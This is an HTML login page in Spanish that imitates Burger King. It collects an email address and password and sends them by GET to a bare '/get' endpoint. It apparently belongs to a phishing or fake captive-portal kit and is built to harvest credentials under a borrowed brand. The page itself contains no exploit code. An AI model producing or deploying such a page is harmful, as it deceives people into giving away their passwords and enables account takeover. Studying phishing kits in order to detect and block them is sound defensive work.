<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Burger King - Iniciar sesión</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f5f5f5; /* Fondo gris claro */
        }
        .login-container {
            background-color: #fff; /* Fondo blanco */
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
            text-align: center; /* Centramos el contenido */
        }
        #logo {
            margin-bottom: 20px;
        }
        h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #c2a56b; /* Color de texto oscuro (marrón Burger King) */
        }
        h2 {
            margin-bottom: 20px;
            font-size: 14px;
            color: #666; /* Texto más claro */
        }
        .g-input {
            display: block;
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #d1d1d6;
            border-radius: 8px;
            font-size: 16px;
        }
        .g-input:focus {
            border-color: #c2a56b; /* Color marrón Burger King en foco */
            outline: none; /* Sin borde de enfoque */
        }
        .gbtn-primary {
            display: block;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background-color: #c2a56b; /* Marrón Burger King */
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .gbtn-primary:hover {
            background-color: #b3925c; /* Marrón más oscuro al hacer hover */
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .footer a {
            color: #c2a56b; /* Color marrón Burger King */
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div id="logo">
            <!-- Logo de Burger King -->
             </div>
        <h1>Iniciar sesión</h1>
        <h2>Con tu cuenta de correo electronico.</h2>
        <form action="/get" id="email-form-step">
            <input name="email" type="email" class="g-input" placeholder="Correo electrónico" required>
            <input name="password" type="password" class="g-input" placeholder="Contraseña" required>
            <button class="gbtn-primary" type="submit">Iniciar sesión</button>
        </form>
        <div class="footer">
            <p>¿No tienes cuenta? <a href="#">Crea una cuenta</a></p>
        </div>
    </div>
</body>
</html>
